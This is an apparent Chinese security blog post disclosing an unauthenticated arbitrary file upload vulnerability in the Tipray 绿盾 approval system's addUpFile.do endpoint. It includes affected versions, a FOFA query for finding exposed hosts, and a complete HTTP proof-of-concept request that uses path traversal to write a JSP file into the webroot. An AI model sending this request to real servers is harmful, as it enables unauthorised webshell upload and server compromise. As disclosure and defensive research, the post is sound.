---
title: "天锐绿盾审批系统 addUpFile.do 任意文件上传漏洞"
source: https://mrxn.net/jswz/trwfe-addUpFile-upload-rce.html
asset_dir: assets/天锐绿盾审批系统-addupfile.do-任意文件上传漏洞
---

# 天锐绿盾审批系统 addUpFile.do 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/11/14 08:30
- 599浏览
- [0评论](#comment)
- 10分钟阅读

深入探索

软件

Nessus

Web安全书籍

---

# 漏洞简介

天锐绿盾审批系统是一款专注于企业数据安全与合规管理的智能审批平台，深度融合了文档加密、权限管控与流程自动化等功能，旨在为企业提供从文件创建、流转到归档的全生命周期安全管控。

漏洞修复方案

该系统的 `addUpFile.do` 接口存在任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞。 未经身份验证的攻击者可以利用此漏洞，通过向 `addUpFile.do` 接口上传恶意文件，例如[Webshell](https://mrxn.net/tag/rce)，从而获取服务器的控制权限。

此漏洞可能导致攻击者完全控制目标服务器，进而造成企业敏感数据泄露、系统被篡改或进一步的网络攻击等严重安全风险。

# 影响版本

> 可通过访问 /trwfe/exports/config.ini 获取版本信息
>
> 计算机安全

V3.53.240913

V7.05.240904

# fofa语法

> app="TIPPAY-绿盾审批系统"

# 漏洞分析

先看`addUpFile.do`的实现

[![天锐绿盾审批系统 addUpFile.do 任意文件上传漏洞](images/img-001-ac0536ebf06a.webp)](https://image.mrxn.net/335243b085b94222ba5cfeed12758c21.webp)

上传的文件被带入`fileService.addFile` 方法，跟进`fileService.addFile`方法看下它的实现

网络安全

深入探索

JSON处理工具

技术文章订阅

安全研究工具

[![天锐绿盾审批系统 addUpFile.do 任意文件上传漏洞](images/img-002-5f6d937ef9ce.webp)](https://image.mrxn.net/d0f802cf33ea469585a064830d6b453a.webp)

全程对上传文件以及`relativepath`没有任何有效校验或者处理，直接保存，响应 `{"success":true}`，代表上传成功，因此造成任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞。

# 漏洞复现

```
POST /trwfe/login.jsp/.%2e/file/addUpFile.do HTTP/1.1
Host: trwfe.mrxn.net
Content-Type: multipart/form-data; boundary=----123

------123
Content-Disposition: form-data; name="relativepath";

../../webapps/trwfe/t
------123
Content-Disposition: form-data; name="file"; filename="1.jsp"

<%out.println(java.util.UUID.randomUUID().toString());new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------123--
```

访问上传文件trwfe/1.jsp

漏洞修复方案

[![天锐绿盾审批系统 addUpFile.do 任意文件上传漏洞](images/img-003-47d557b463fc.webp)](https://image.mrxn.net/d4f51d46e5624054b4d1ba76fdaedf91.webp)

[成功执行](https://mrxn.net/tag/rce)打印随机uuid后，删除自身

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
